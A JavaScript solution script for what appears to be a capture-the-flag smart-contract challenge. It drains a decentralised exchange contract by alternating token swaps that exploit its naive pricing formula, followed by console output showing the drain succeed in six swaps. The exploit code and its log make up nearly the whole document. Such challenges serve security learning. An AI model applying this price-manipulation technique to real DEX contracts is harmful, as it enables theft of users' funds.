// `getSwapPrice = (amount * to_balance) / from_balance` 
// alternate swaps back and forth between the two tokens
// swaps changes the token ratios in the dex, making subsequent swaps more favorable
// each swaps gets me more tokens than a fair exchange would give
// tldr: the pricing formula creates arbitrage opportunities
// each swap shifts the balance ratio and the dex doesn't have proper slippage protection
async function drainDex() {
  // Get token addresses
  const token1 = await contract.token1();
  const token2 = await contract.token2();
  
  // Approve DEX to spend tokens
  console.warn("Approving tokens for DEX...");
  await contract.approve(contract.address, _ethers.constants.MaxUint256);
  
  // Log initial balances
  console.warn("\n--- INITIAL STATE ---");
  console.warn("Player Token1:", (await contract.balanceOf(token1, player)).toString());
  console.warn("Player Token2:", (await contract.balanceOf(token2, player)).toString());
  console.warn("DEX Token1:", (await contract.balanceOf(token1, contract.address)).toString());
  console.warn("DEX Token2:", (await contract.balanceOf(token2, contract.address)).toString());
  
  // Start with token1
  let fromToken = token1;
  let toToken = token2;
  let swapCount = 0;
  
  // Continue until DEX is drained of at least one token
  while (true) {
    swapCount++;
    console.warn(`\n--- SWAP #${swapCount} ---`);
    
    // Get current balances
    const dexFromBalance = await contract.balanceOf(fromToken, contract.address);
    const dexToBalance = await contract.balanceOf(toToken, contract.address);
    const playerFromBalance = await contract.balanceOf(fromToken, player);
    
    // Check if we've already drained one token
    if (dexFromBalance.toString() === "0" || dexToBalance.toString() === "0") {
      console.warn("🎉 SUCCESS! One token drained from DEX!");
      break;
    }
    
    // Skip if player has no tokens to swap
    if (playerFromBalance.toString() === "0") {
      console.warn(`No ${fromToken === token1 ? 'token1' : 'token2'} to swap. Skipping to next token.`);
      // Switch tokens
      [fromToken, toToken] = [toToken, fromToken];
      continue;
    }
    
    // Calculate how much we would receive
    const amountReceived = await contract.getSwapPrice(fromToken, toToken, playerFromBalance);
    console.warn(`If we swap all ${playerFromBalance.toString()}, we would receive ${amountReceived.toString()}`);
    
    // Check if we would receive more than DEX has (would cause revert)
    const shouldAdjustAmount = amountReceived.gt(dexToBalance);
    let amountToSwap = playerFromBalance;
    
    if (shouldAdjustAmount) {
      // Calculate exact amount to drain DEX of toToken
      // Formula: amount = (playerFromBalance * dexToBalance) / amountReceived
      // This is equivalent to the Solidity: amount = (amount * 110) / amountReceived
      console.warn("Would receive more than DEX has. Calculating optimal amount...");
      
      // Create fresh BigNumber instances for safe math
      const numerator = _ethers.BigNumber.from(playerFromBalance.toString()).mul(_ethers.BigNumber.from(dexToBalance.toString()));
      const adjusted = numerator.div(_ethers.BigNumber.from(amountReceived.toString()));
      amountToSwap = adjusted;
      
      console.warn(`Adjusted swap amount: ${amountToSwap.toString()}`);
    }
    
    // Execute the swap
    console.warn(`Swapping ${amountToSwap.toString()} ${fromToken === token1 ? 'token1' : 'token2'} for ${toToken === token1 ? 'token1' : 'token2'}...`);
    
    try {
      await contract.swap(fromToken, toToken, amountToSwap);
      console.warn("Swap completed successfully!");
    } catch (error) {
      console.warn("Swap failed:", error.message);
      
      // If exact calculation failed, try with slightly less
      if (shouldAdjustAmount) {
        const reducedAmount = _ethers.BigNumber.from(amountToSwap.toString()).sub(_ethers.BigNumber.from("1"));
        console.warn(`Trying with reduced amount: ${reducedAmount.toString()}`);
        
        try {
          await contract.swap(fromToken, toToken, reducedAmount);
          console.warn("Reduced amount swap completed successfully!");
        } catch (retryError) {
          console.warn("Reduced amount swap also failed:", retryError.message);
        }
      }
    }
    
    // Log current state
    console.warn("\nCurrent balances:");
    console.warn("Player Token1:", (await contract.balanceOf(token1, player)).toString());
    console.warn("Player Token2:", (await contract.balanceOf(token2, player)).toString());
    console.warn("DEX Token1:", (await contract.balanceOf(token1, contract.address)).toString());
    console.warn("DEX Token2:", (await contract.balanceOf(token2, contract.address)).toString());
    
    // Switch tokens for next iteration
    [fromToken, toToken] = [toToken, fromToken];
    
    // Safety check to prevent infinite loop
    if (swapCount > 10) {
      console.warn("Maximum swap count reached. Breaking loop.");
      break;
    }
  }
  
  // Final check
  const finalDexToken1 = await contract.balanceOf(token1, contract.address);
  const finalDexToken2 = await contract.balanceOf(token2, contract.address);
  
  if (finalDexToken1.toString() === "0" || finalDexToken2.toString() === "0") {
    console.warn("\n🏆 CHALLENGE COMPLETED! The DEX has been drained of at least one token.");
  } else {
    console.warn("\n❌ Challenge not completed. The DEX still has both tokens.");
  }
}

// Execute the function
drainDex();

/*
Approving tokens for DEX...
await in drainDex
--- INITIAL STATE ---
await in drainDex
Player Token1:,10
await in drainDex
Player Token2:,10
await in drainDex
DEX Token1:,100
await in drainDex
DEX Token2:,100
await in drainDex
--- SWAP #1 ---
await in drainDex
If we swap all 10, we would receive 10
await in drainDex
Swapping 10 token1 for token2...
await in drainDex
Swap completed successfully!
await in drainDex
Current balances:
await in drainDex
Player Token1:,0
await in drainDex
Player Token2:,20
await in drainDex
DEX Token1:,110
await in drainDex
DEX Token2:,90
await in drainDex
--- SWAP #2 ---
await in drainDex
If we swap all 20, we would receive 24
await in drainDex
Swapping 20 token2 for token1...
await in drainDex
Swap completed successfully!
await in drainDex
Current balances:
await in drainDex
Player Token1:,24
await in drainDex
Player Token2:,0
await in drainDex
DEX Token1:,86
await in drainDex
DEX Token2:,110
await in drainDex
--- SWAP #3 ---
await in drainDex
If we swap all 24, we would receive 30
await in drainDex
Swapping 24 token1 for token2...
await in drainDex
Swap completed successfully!
await in drainDex
Current balances:
await in drainDex
Player Token1:,0
await in drainDex
Player Token2:,30
await in drainDex
DEX Token1:,110
await in drainDex
DEX Token2:,80
await in drainDex
--- SWAP #4 ---
await in drainDex
If we swap all 30, we would receive 41
await in drainDex
Swapping 30 token2 for token1...
await in drainDex
Swap completed successfully!
Current balances:
Player Token1:,41
Player Token2:,0
DEX Token1:,69
DEX Token2:,110
--- SWAP #5 ---
If we swap all 41, we would receive 65
Swapping 41 token1 for token2...
Swap completed successfully!
Current balances:
Player Token1:,0
Player Token2:,65
DEX Token1:,110
DEX Token2:,45
--- SWAP #6 ---
If we swap all 65, we would receive 158
Would receive more than DEX has. Calculating optimal amount...
Adjusted swap amount: 45
Swapping 45 token2 for token1...
Swap completed successfully!
Current balances:
Player Token1:,110
Player Token2:,20
DEX Token1:,0
DEX Token2:,90
--- SWAP #7 ---
🎉 SUCCESS! One token drained from DEX!
🏆 CHALLENGE COMPLETED! The DEX has been drained of at least one token.
*/
